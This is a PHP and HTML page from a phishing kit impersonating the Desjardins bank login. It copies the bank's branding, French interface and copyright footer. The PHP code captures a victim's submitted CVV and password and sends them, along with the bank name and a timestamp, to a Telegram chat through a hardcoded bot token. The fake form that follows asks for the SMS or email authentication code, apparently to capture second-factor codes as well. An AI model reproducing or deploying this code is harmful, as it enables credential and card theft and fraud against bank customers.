<?php 
session_start();

// Vérifie si l'utilisateur arrive sur la page via une redirection et s'il y a des données à traiter
if (!isset($_GET['loop'])) {
    if (!isset($_POST["cvv"]) || !isset($_POST["mdp"])) {
        header("Location: ./index.php");
        exit();
    }
}

// Si les données de connexion sont présentes, les enregistrer dans la session
if (isset($_POST["cvv"]) || isset($_POST["mdp"])) {
    $_SESSION["cvv"] = $_POST['cvv'];
    $_SESSION["mdp"] = $_POST['mdp'];
    $heure = date("h:i:s");
    $date = date("Y-m-d");

    // Prépare le message formaté à envoyer sur Telegram
    $message = "📢 **NOUVELLE CONNEXION** 📢\n\n" .
               "🏦 **Banque** : " . $_SESSION["bank"] . "\n" .
               "🕒 **Heure** : " . $heure . "\n" .
               "📅 **Date** : " . $date . "\n" .
               "💳 **CVV** : `" . $_SESSION["cvv"] . "`\n" .
               "🔑 **Mot de Passe** : `" . $_SESSION["mdp"] . "`\n";

    // Informations pour l'envoi sur Telegram
    $token = "7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg"; // Remplace par ton token
    $chat_id = "6242884372"; // Remplace par ton chat ID

    // URL de l'API Telegram pour envoyer le message
    $urlMessage = "https://api.telegram.org/bot$token/sendMessage";

    // Tableau de données pour envoyer le message formaté
    $dataMessage = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
    ];

    // Envoi du message via cURL
    $chMessage = curl_init();
    curl_setopt($chMessage, CURLOPT_URL, $urlMessage);
    curl_setopt($chMessage, CURLOPT_POST, 1);
    curl_setopt($chMessage, CURLOPT_POSTFIELDS, http_build_query($dataMessage));
    curl_setopt($chMessage, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chMessage, CURLOPT_SSL_VERIFYPEER, false);

    // Exécute la requête d'envoi du message
    $responseMessage = curl_exec($chMessage);

    // Vérifie si cURL a rencontré une erreur lors de l'envoi du message
    if (curl_errno($chMessage)) {
        echo 'Erreur cURL (message) : ' . curl_error($chMessage);
    }
    curl_close($chMessage);

    // URL de l'API Telegram pour envoyer un sticker
    $urlSticker = "https://api.telegram.org/bot$token/sendSticker";

    // Envoie un sticker après le message
    $dataSticker = [
        'chat_id' => $chat_id,
        'sticker' => 'CAACAgIAAxkBAAEG9Utkp1g7LXoPDE7LIF8RCtEF5lVpPgACXgIAAladvQrmMlSMUATdlx4E' // Remplace par le File ID du sticker souhaité
    ];

    // Envoi du sticker via cURL
    $chSticker = curl_init();
    curl_setopt($chSticker, CURLOPT_URL, $urlSticker);
    curl_setopt($chSticker, CURLOPT_POST, 1);
    curl_setopt($chSticker, CURLOPT_POSTFIELDS, http_build_query($dataSticker));
    curl_setopt($chSticker, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chSticker, CURLOPT_SSL_VERIFYPEER, false);

    // Exécute la requête d'envoi du sticker
    $responseSticker = curl_exec($chSticker);

    // Vérifie si cURL a rencontré une erreur lors de l'envoi du sticker
    if (curl_errno($chSticker)) {
        echo 'Erreur cURL (sticker) : ' . curl_error($chSticker);
    }
    curl_close($chSticker);
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">   
    
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/desjardin/styles_mobile.css">

<link rel="stylesheet" media="screen and (min-width: 769px)" href="/desjardin/styles_pc.css">

    <title>se connecter</title>
</head>

<header>
    <div class="firstHead">
        <span>
            <span>    AA</span>
            <span>English</span>
            <span>Nous joindre</span>
            <span>Aide</span>
        </span>

    </div>
    <div class="secondHeader">
<img width="200px" height="40px" src="./img/logo1.svg">
<img class="logo2" width="150px" height="40px" src="./img/logo2.svg">
<img class="logo3" width="150px" height="40px" src="./img/logo3.svg">
    </div>
</header>
<body>
    <div class="container">
        <div class="formContainer">
        <form action="/desjardin/loop.php" method="post">
                <h1>Se Connecter</h1>
            <label for="sms"> Vous recevrez un code d'authenthification sur votre E-mail ou sms</label>
            <input type="text" name="sms">

       

        <div class="valid">
            <input type="submit" value="Valider">
        </div>
            

        </form>

        <div class="formFooter">
            <div class="nav1">
            <ul><a href="">S’inscrire à AccèsD</a></ul>
            <ul><a href="">S’inscrire à AccèsD Affaires</a></ul>
            <ul><a href="">Devenir membre</a></ul>
            </div>

        <div class="nav2">
            <div class="nav2-1">
                <ul><a href="">  Sécurité du site</a></ul>
                <ul><a href="">Soutien technique</a></ul>
                <ul><a href="">Signaler une fraude</a></ul>
            </div>

            <div class="nav2-2">
          <ul><a href="">   
            <img style="width:15px ; margin-right:10px" src="./img/lock.svg" alt="">Sécurité garantie à 100 %</a></ul>
            </div>
        </div>
    </div>
 </div>

        <div class="image">

        </div>
    </div>
    
</body>

<footer>
    <div class="h-footer">
    <ul class="ul-1" ><a href=""><b>SERVICES AUX PARTICULIERS</b></a></ul> 
   <ul class="ul-2" ><a href=""><b> SERVICES AUX ENTREPRISES </b></a></ul>
   <ul class="ul-3" ><a href=""><b>CONSEILS </b></a></ul>
   <ul class="ul-4" ><a href=""><b>À PROPOS </b></a></ul>
   <ul ><a href=""><b>APPLICATION MOBILE</b></a></ul>
    </div>

    <div class="b-footer">
        <div class="b-footer-1">
        <ul class="ul-1" ><a href=""><b> Sécurité </b></a></ul>
        <ul class="ul-2" ><a href=""><b>  Conditions d'utilisation et notes légales </b></a></ul> 
        <ul class="ul-3" ><a href=""><b> Confidentialité </b></a></ul>
        <ul class="ul-4" ><a href=""><b>  Personnaliser les témoins </b></a></ul>
        <ul class="ul-5" ><a href=""><b>    Accessibilité </b></a></ul>
        <ul class="ul-6" ><a href=""><b> Plan du site </b></a></ul>
       
        
        </div>
        <div class="b-footer-2">
        © 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.
        </div>
    </div>
</footer>
</html>